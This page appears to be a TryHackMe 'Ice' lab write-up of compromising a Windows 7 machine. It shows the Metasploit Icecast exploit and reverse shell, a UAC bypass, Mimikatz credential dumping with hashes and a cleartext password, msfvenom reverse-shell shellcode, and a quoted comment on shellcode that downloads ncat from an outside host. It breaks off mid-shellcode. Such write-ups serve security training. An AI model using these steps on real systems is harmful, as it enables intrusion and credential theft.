---
layout: page
title: Ice
description: Public exploit.
img: 
importance: 4
category: TryHackMe
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/ice/logo.png" title="THM Ice Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/ice">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Ice to meet you, everyone.  We are going to tackle the Ice room from TryHackMe.  Let's go!

Now, we will run nmap to find those services.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/madness]
└─$ sudo nmap -sC -sV -A -O -oN nmap -Pn -T 5 10.10.126.243
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-15 00:35 AEDT
Nmap scan report for 10.10.126.243
Host is up (0.26s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2025-01-14T13:37:32+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: DARK-PC
|   NetBIOS_Domain_Name: DARK-PC
|   NetBIOS_Computer_Name: DARK-PC
|   DNS_Domain_Name: Dark-PC
|   DNS_Computer_Name: Dark-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2025-01-14T13:37:17+00:00
| ssl-cert: Subject: commonName=Dark-PC
| Not valid before: 2025-01-13T13:32:40
|_Not valid after:  2025-07-15T13:32:40
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http         Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC

<snip>
```
{% endraw %}

<br />
Start msfconsole in quiet mode to supress the ASCII art.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/ice]
└─$ msfconsole -q         
msf6 >
```
{% endraw %}

<br />
Search for Icecast in msfconsole.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/ice]
└─$ msfconsole -q         
msf6 > search icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header
```
{% endraw %}

<br />
Look-up the exploit in cvedetails.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/ice/cvedetails.png" title="CVEDetails" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
In msfconsole, choose to use the Icecast exploit.

{% raw %}
```bash
msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/icecast_header) >
```
{% endraw %}

<br />
Choose to show the options of the exploit so we know what we need to update.

{% raw %}
```bash
msf6 exploit(windows/http/icecast_header) > show options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```
{% endraw %}

<br />
Set the lhost and set the rhosts.

{% raw %}
```bash
msf6 exploit(windows/http/icecast_header) > set lhost tun0
lhost => 10.4.119.29
msf6 exploit(windows/http/icecast_header) > set lhost tun0
lhost => 10.4.119.29
msf6 exploit(windows/http/icecast_header) > set rhosts 10.10.126.243
rhosts => 10.10.126.243
msf6 exploit(windows/http/icecast_header) >
```
{% endraw %}

<br />
Run the exploit.

{% raw %}
```bash
msf6 exploit(windows/http/icecast_header) > exploit

[*] Started reverse TCP handler on 10.4.119.29:4444 
[*] Sending stage (176198 bytes) to 10.10.126.243
[*] Meterpreter session 1 opened (10.4.119.29:4444 -> 10.10.126.243:49258) at 2025-01-15 01:43:36 +1100

meterpreter >
```
{% endraw %}

<br />
Drop into a shell and run whoami.

{% raw %}
```bash
meterpreter > shell
Process 3176 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Icecast2 Win32>whoami
whoami
dark-pc\dark
```
{% endraw %}

<br />
In meterpreter, run getuid.

{% raw %}
```bash
meterpreter > getuid
Server username: Dark-PC\Dark
```
{% endraw %}

<br />
Run sysinfo.

{% raw %}
```bash
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```
{% endraw %}

<br />
Run local_exploit_suggester.

{% raw %}
```bash
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.126.243 - Collecting local exploits for x86/windows...
[*] 10.10.126.243 - 193 exploit checks are being tried...
[+] 10.10.126.243 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.126.243 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.10.126.243 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.10.126.243 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.126.243 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.126.243 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.126.243 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.126.243 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.126.243 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[+] 10.10.126.243 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.126.243 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 3   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 4   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.

 <snip>
```
{% endraw %}

<br />
Background the session by using Control + z, note the session number.

{% raw %}
```bash
meterpreter > 
Background session 1? [y/N]  y
[-] Unknown command: y
msf6 exploit(windows/http/icecast_header) > sessions

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.4.119.29:4444 -> 10.10.126.243:49258 (10.10.126.243)
```
{% endraw %}

<br />
Choose to use the Event Viewer exploit.

{% raw %}
```bash
msf6 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```
{% endraw %}

<br />
Set the session number to the session that we looked-up earlier.

{% raw %}
```bash
msf6 exploit(windows/local/bypassuac_eventvwr) > set SESSION 1
SESSION => 1
```
{% endraw %}

<br />
Show the options for the exploit.

{% raw %}
```bash
msf6 exploit(windows/local/bypassuac_eventvwr) > show options

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.
```
{% endraw %}

<br />
Set lhost to the tun0 interface IP address.

{% raw %}
```bash
msf6 exploit(windows/local/bypassuac_eventvwr) > set lhost tun0
lhost => 10.4.119.29
msf6 exploit(windows/local/bypassuac_eventvwr) > set lhost tun0
lhost => 10.4.119.29
```
{% endraw %}

<br />
Run the exploit and choose to use the new session.

{% raw %}
```bash
msf6 exploit(windows/local/bypassuac_eventvwr) > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```
{% endraw %}

<br />
Run getprivs to get a list of the privileges.

{% raw %}
```bash
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter >
```
{% endraw %}

<br />
Run ps to get a list of the processes.

{% raw %}
```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 460   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 564   556   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 612   556   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 624   604   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 672   604   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 712   612   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 720   612   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 728   612   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 784   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 840   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 908   712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 956   712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1088  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1140  1856  powershell.exe        x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe
 1216  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1324  460   dwm.exe               x64   1        Dark-PC\Dark                  C:\Windows\System32\dwm.exe
 1340  1300  explorer.exe          x64   1        Dark-PC\Dark                  C:\Windows\explorer.exe
 1400  712   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1428  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1504  712   taskhost.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\taskhost.exe
 1596  712   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1684  712   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1724  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1772  840   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 1880  712   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 2108  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2276  712   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 2388  1340  Icecast2.exe          x86   1        Dark-PC\Dark                  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2484  712   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 2548  840   slui.exe              x64   1        Dark-PC\Dark                  C:\Windows\System32\slui.exe
 2700  712   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 2712  712   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 3128  624   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
```
{% endraw %}

<br />
Check for a process that has the same architecture and privileges.

{% raw %}
```bash
1400  712   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
```
{% endraw %}

<br />
Load kiwi, an updated version of Mimikatz.

{% raw %}
```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```
{% endraw %}

<br />
Run help to get a list of commands.

{% raw %}
```bash
<snip>

Kiwi Commands
=============

    Command       Description
    -------       -----------
    creds_all     Retrieve all credentials (parsed)
    creds_kerber  Retrieve Kerberos creds (parsed)
    os
    creds_livess  Retrieve Live SSP creds
    p
    creds_msv     Retrieve LM/NTLM creds (parsed)
    creds_ssp     Retrieve SSP creds
    creds_tspkg   Retrieve TsPkg creds (parsed)
    creds_wdiges  Retrieve WDigest creds (parsed)
    t
    dcsync        Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm   Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticke  Create a golden kerberos ticket
    t_create
    kerberos_tic  List all kerberos tickets (unparsed)
    ket_list
    kerberos_tic  Purge any in-use kerberos tickets
    ket_purge
    kerberos_tic  Use a kerberos ticket
    ket_use
    kiwi_cmd      Execute an arbitrary mimikatz command (unparsed)
    lsa_dump_sam  Dump LSA SAM (unparsed)
    lsa_dump_sec  Dump LSA secrets (unparsed)
    rets
    password_cha  Change the password/hash of a user
    nge
    wifi_list     List wifi profiles/creds for the current user
    wifi_list_sh  List shared wifi profiles/creds (requires SYSTEM)

    <snip>
```
{% endraw %}

<br />
Run creds_all to get the dark creds.

{% raw %}
```bash
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)
```
{% endraw %}

<br />
Run hashdump to dump the hashes.

{% raw %}
```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
{% endraw %}

<br />
Get the full meterpreter help list.  Notice the record_mic, screenshare, timestomp, and create_golden_ticket to record the microphone, watch the desktop in real-time, modify the time-stamps of files on the system, and create the golden ticket, respectively.

{% raw %}
```bash
meterpreter > help

Core Commands
=============

<snip>
```
{% endraw %}

<br />
Choose to enable RDP.

{% raw %}
```bash
meterpreter > run post/windows/manage/enable_rdp

[*] Enabling Remote Desktop
[*]     RDP is already enabled
[*] Setting Terminal Services service startup mode
[*]     The Terminal Services service is not set to auto, changing it to auto ...
[*]     Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /home/kali/.msf4/loot/20250115021829_default_10.10.126.243_host.windows.cle_529375.txt
```
{% endraw %}

<br />
Download the C code for this vulnerability.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/ice]
└─$ wget https://www.exploit-db.com/raw/568 -O poc.c
--2025-01-15 02:35:56--  https://www.exploit-db.com/raw/568
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6831 (6.7K) [text/plain]
Saving to: ‘poc.c’

poc.c                                                      100%[========================================================================================================================================>]   6.67K  --.-KB/s    in 0s      

2025-01-15 02:35:57 (179 MB/s) - ‘poc.c’ saved [6831/6831]
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/ice/new]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Get the msfvenom to generate a new payload.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/ice]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.4.119.29 LPORT=443 ExitFunc=thread -f c -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of c file: 1398 bytes
unsigned char shellcode[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32"
"\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x04\x77\x1d\x68\x02"
"\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5"
"\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57"
"\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46"
"\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89"
"\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb"
"\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
"\xff\xd5";
```
{% endraw %}

<br />
Update the poc.c with the new shellcode.

{% raw %}
```c
<snip>

#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 

#ifdef WIN32 
#pragma comment(lib, "ws2_32.lib") 
    #include <winsock.h> 
    #include "winerr.h" 

    #define close closesocket 
#else 
    #include <unistd.h> 
    #include <sys/socket.h> 
    #include <sys/types.h> 
    #include <arpa/inet.h> 
    #include <netdb.h> 
    #include <netinet/in.h> 
#endif 

#define VER "0.1" 
#define PORT 8000 
#define BUFFSZ2048 
#define TIMEOUT 3 
#define EXEC"GET / HTTP/1.0rn" 
                "arn" "arn" "arn" "arn" "arn" "arn" "arn" "arn" 
                "arn" "arn" "arn" "arn" "arn" "arn" "arn" "arn" 
                "arn" "arn" "arn" "arn" "arn" "arn" "arn" "arn" 
                "arn" "arn" "arn" "arn" "arn" "arn" "arn" 
                "xcc" 
//web download and execution shellcode 
//which downloads http://www.elitehaven.net/ncat.exe 
//this ncat spwans a shell on port 9999 
unsigned char shellcode[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32"
"\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x04\x77\x1d\x68\x02"
"\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5"
"\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57"
"\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46"
"\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89"
"\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb"
"\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
"\xff\xd5"; 

<snip>
```
{% endraw %}

<br />
Attempt to compile the exploit.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/ice/new2]
└─$ gcc -o poc poc.c  
poc.c:61:9: warning: ISO C99 requires whitespace after the macro name
   61 | #define EXEC"GET / HTTP/1.0rn"

<snip>
```
{% endraw %}

<br />
Research the issues and discover this edited version of the exploit.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/ice/research.png" title="Research Exploit Behaviour" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/Danyw24/CVE-2004-1561-Icecast-Header-Overwrite-buffer-overflow-RCE-2.0.1-Win32-">https://github.com/Danyw24/CVE-2004-1561-Icecast-Header-Overwrite-buffer-overflow-RCE-2.0.1-Win32-</a>

<br />
Download 568-edit.c exploit.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/ice]
└─$ wget https://raw.githubusercontent.com/Danyw24/CVE-2004-1561-Icecast-Header-Overwrite-buffer-overflow-RCE-2.0.1-Win32-/refs/heads/main/568-edit.c --inet4-only
--2025-03-22 10:45:23--  https://raw.githubusercontent.com/Danyw24/CVE-2004-1561-Icecast-Header-Overwrite-buffer-overflow-RCE-2.0.1-Win32-/refs/heads/main/568-edit.c
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6581 (6.4K) [text/plain]
Saving to: ‘568-edit.c’

568-edit.c                                                 100%[========================================================================================================================================>]   6.43K  --.-KB/s    in 0.003s  

2025-03-22 10:45:24 (1.80 MB/s) - ‘568-edit.c’ saved [6581/6581]
```
{% endraw %}

<br />
Compile the new exploit.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/ice/new3]
└─$ gcc ./568-edit.c -o 568 && chmod 775 ./568
```
{% endraw %}

<br />
Generate a new payload with the badchars.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/ice/new3]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.4.119.29 LPORT=443 ExitFunc=thread -f c -v shellcode -b '\x0a\x0d\x00'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1512 bytes
unsigned char shellcode[] = 
"\xd9\xf7\xbe\x64\x8f\xb7\xc4\xd9\x74\x24\xf4\x5f\x33\xc9"
"\xb1\x52\x31\x77\x17\x83\xef\xfc\x03\x13\x9c\x55\x31\x27"
"\x4a\x1b\xba\xd7\x8b\x7c\x32\x32\xba\xbc\x20\x37\xed\x0c"
"\x22\x15\x02\xe6\x66\x8d\x91\x8a\xae\xa2\x12\x20\x89\x8d"
"\xa3\x19\xe9\x8c\x27\x60\x3e\x6e\x19\xab\x33\x6f\x5e\xd6"
"\xbe\x3d\x37\x9c\x6d\xd1\x3c\xe8\xad\x5a\x0e\xfc\xb5\xbf"
"\xc7\xff\x94\x6e\x53\xa6\x36\x91\xb0\xd2\x7e\x89\xd5\xdf"
"\xc9\x22\x2d\xab\xcb\xe2\x7f\x54\x67\xcb\x4f\xa7\x79\x0c"
"\x77\x58\x0c\x64\x8b\xe5\x17\xb3\xf1\x31\x9d\x27\x51\xb1"
"\x05\x83\x63\x16\xd3\x40\x6f\xd3\x97\x0e\x6c\xe2\x74\x25"
"\x88\x6f\x7b\xe9\x18\x2b\x58\x2d\x40\xef\xc1\x74\x2c\x5e"
"\xfd\x66\x8f\x3f\x5b\xed\x22\x2b\xd6\xac\x2a\x98\xdb\x4e"
"\xab\xb6\x6c\x3d\x99\x19\xc7\xa9\x91\xd2\xc1\x2e\xd5\xc8"
"\xb6\xa0\x28\xf3\xc6\xe9\xee\xa7\x96\x81\xc7\xc7\x7c\x51"
"\xe7\x1d\xd2\x01\x47\xce\x93\xf1\x27\xbe\x7b\x1b\xa8\xe1"
